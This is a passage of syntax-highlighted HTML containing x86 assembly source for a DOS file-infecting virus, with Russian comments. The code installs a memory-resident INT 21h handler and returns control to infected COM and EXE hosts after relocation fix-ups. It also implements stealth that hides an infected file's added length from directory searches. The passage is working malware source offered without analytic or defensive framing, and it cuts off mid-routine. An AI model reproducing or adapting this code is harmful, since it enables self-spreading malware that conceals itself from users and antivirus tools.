        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">begin_manager</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">M_ADDR</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">      </span><span class="sc1">; DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">install_int21</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">goto_normal_programm</span><span class="sc0">
</span><span class="sc5">manager_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">goto_normal_programm</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">manager_idle_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">install_int21</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ GO TO NORMAL PROGRAMM ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc5">goto_normal_programm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">;EXE файл</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">itis_EXE_file</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────── COM ──────────────────────────────────────</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">   </span><span class="sc1">;DS:[SI] -&gt; ES:[DI]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">turnoff_A20</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0100h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">itis_EXE_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">;Relo CS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">     </span><span class="sc1">;Relo SS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">sp_correct</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">ss_correct</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">jump_correct</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">turnoff_A20</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">   </span><span class="sc1">;МОV SP,CS:[XXXX]</span><span class="sc0">
</span><span class="sc5">sp_correct</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">   </span><span class="sc1">;МОV SP,CS:[XXXX]</span><span class="sc0">
</span><span class="sc5">ss_correct</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">
</span><span class="sc5">jump_to_normal_programm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">02Eh</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">02Eh</span><span class="sc0"> </span><span class="sc1">;JMP DWORD PTR CS:[]</span><span class="sc0">
</span><span class="sc5">jump_correct</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_first_20_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc1">;────────────────────────────────────────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">turnoff_A20</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_turnoff_A20</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4310h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">himem_entrypoint</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">himem_entrypoint</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_himem</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">exit_turnoff_A20</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ INT 21 PROCESSING ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀</span><span class="sc0">
</span><span class="sc5">virus_int21_processing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_1</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Задача - пеpенести путь до искаемых файлов                                 │</span><span class="sc0">
</span><span class="sc1">;DS:DX - путь                                                              ;│</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_4F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:SI -&gt; ES:DI                                     ;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">function_4E_4F</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_2</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Скpываем длинну, это для функций 4E и 4F.                                 ;│</span><span class="sc0">
</span><span class="sc5">function_4E_4F</span><span class="sc4">:</span><span class="sc0">                                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                                  </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;Выход: ES:BX - адpесс DTA                                         ;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_stealth</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">]</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">q_file_infected</span><span class="sc0">                                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_stealth</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_4F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">seach_name_from_path</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Eh</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Имя файла                                    ;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">  </span><span class="sc1">;DS:SI -&gt; ES:DI                                    ;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_4F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">return_original_size_of_file</span><span class="sc0">                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_stealth</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">exit_clc_stealth</span><span class="sc4">:</span><span class="sc0">                                                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                                                     </span><span class="sc1">;│   ;│</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc5">exit_stc_stealth</span><span class="sc4">:</span><span class="sc0">                                                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">                                                         </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">714Eh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_3</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc1">;Задача - пеpенести путь до искаемых файлов                                 │</span><span class="sc0">
</span><span class="sc1">;DS:DX - путь                                                              ;│</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_714F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0"> </span><span class="sc1">;DS:SI -&gt; ES:DI                                     ;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                                                               </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">function_714E_714F</span><span class="sc0">                                        </span><span class="sc1">;│</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┘</span><span class="sc0">
</span><span class="sc5">next_step_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">714Fh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">next_step_4</span><span class="sc0">
</span><span class="sc1">;───────────────────────────────────────────────────────────────────────────┐</span><span class="sc0">
</span><span class="sc5">function_714E_714F</span><span class="sc4">:</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_int21</span><span class="sc0">                                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_stc_stealth_714F</span><span class="sc0">                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc1">;ES:DI - стpуктуpа данных                                          ;│</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">                                                              </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">                                            </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                                          </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">q_file_infected</span><span class="sc0">                                           </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_clc_stealth_714E_714F</span><span class="sc0">                                </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">                                                        </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">path_for_714F_function</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                   </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">seach_name_from_path</span><span class="sc0">                                      </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Имя файла                                    ;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">                                                    </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">movsb</span><span class="sc0">  </span><span class="sc1">;DS:SI -&gt; ES:DI                                    ;│</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                                                     </span><span class="sc1">;│</span><span class="sc0">
